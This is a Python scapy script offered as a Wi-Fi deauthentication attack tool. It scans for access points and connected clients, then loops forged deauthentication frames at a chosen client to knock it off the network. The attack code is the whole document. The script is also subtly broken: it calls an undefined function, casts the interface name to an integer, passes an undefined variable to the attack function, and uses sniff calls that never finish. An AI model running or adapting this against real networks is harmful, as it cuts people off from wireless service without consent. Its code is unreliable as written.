from scapy.all import *
import sys
import time
import signal
import pandas


# Function checks if the user has root privileges
def check_root():
    if os.geteuid() != 0:
        print("\nYou need to have root privileges to run this script.\n")
        sys.exit(1)

# Fucntion recieves the interface name, the access point BSSID and returns a list of all the MAC addresses of the clients connected to the access point
def getClients(interface,accessPointBSSID):
    # Create a list of clients
    clients = []
    # Create a list of clients
    clients = sniff(iface=interface,count=0,prn=lambda x: clients.append(x.addr2))
    # Create a list of clients MAC addresses
    clientsMAC = []
    # Create a list of clients MAC addresses
    clientsMAC = [x.addr2 for x in clients]
    # Create a list of clients MAC addresses
    clientsMAC = [x for x in clientsMAC if x != "ff:ff:ff:ff:ff:ff"]
    # Create a list of clients MAC addresses
    clientsMAC = [x for x in clientsMAC if x != "00:00:00:00:00:00"]
    # Create a list of clients MAC addresses
    clientsMAC = [x for x in clientsMAC if x != accessPointBSSID]
    # Return the list of clients MAC addresses
    return clientsMAC





# Fucntion recieves the interface name and performs a WLAN scan and returns a list of all the access points BSSID
def scanWLAN(interface):
    # Scanning for the access points
    print("[+] Scanning for access points...")
    # Scapy function to scan for the access points
    accessPoints = []
    # Scapy function to scan for the access points
    accessPoints = sniff(iface=interface,count=0,prn=lambda x: accessPoints.append(x.addr2))
    # List of BSSID of the access points
    accessPointsBSSID = []
    accessPointsBSSID = [x.addr2 for x in accessPoints]
    accessPointsBSSID = list(set(accessPointsBSSID))
    accessPointsBSSID = [x for x in accessPointsBSSID if x != "ff:ff:ff:ff:ff:ff"]
    accessPointsBSSID = [x for x in accessPointsBSSID if x != "00:00:00:00:00:00"]
    return accessPointsBSSID


# Function recieves a list of valid inputs and a string, and asks the user to enter a valid input from the list of valid inputs
def getValidInput(validInputs, prompt):
    # Loop until the user enters a valid input
    while True:
        # Ask the user to enter a valid input
        userInput = input(prompt)
        # Check if the user entered a valid input
        if userInput in validInputs:
            # Return the user input
            return userInput
        # If the user entered an invalid input, print an error message
        else:
            print("[-] Invalid input."+prompt)
            
 # Function perform a deauthentication attack on the client from the access point
def deauth(interface,accessPointBSSID,clientMAC):
    # Create the deauthentication packet
    packet = RadioTap() / Dot11(addr1=clientMAC, addr2=accessPointBSSID, addr3=accessPointBSSID) / Dot11Deauth()
    # Send the deauthentication packet
    sendp(packet, inter=0.1,count = None, loop = 1, iface=interface, verbose = 1)





if __name__ == "__main__":
    interface = int(sys.argv[1])
    accessPointBSSID = scanWLAN(interface)
    # print the access points BSSID
    getValidInput(accessPointBSSID, "\nEnter the access point BSSID:\n")
    clientsMAC= scanConnecedToAP(interface,accessPointBSSID)
    # print the clients MAC addresses
    print("[+] Clients MAC addresses: " + str(clientsMAC))
    getValidInput(clientsMAC, "Enter the client MAC address:\n")
    # perform a deauthentication attack on the client from the access point
    deauth(interface,accessPointBSSID,clientMAC)
    # print the deauthentication attack has been performed
    print("\nDeauthentication attack has been performed.\n")
    



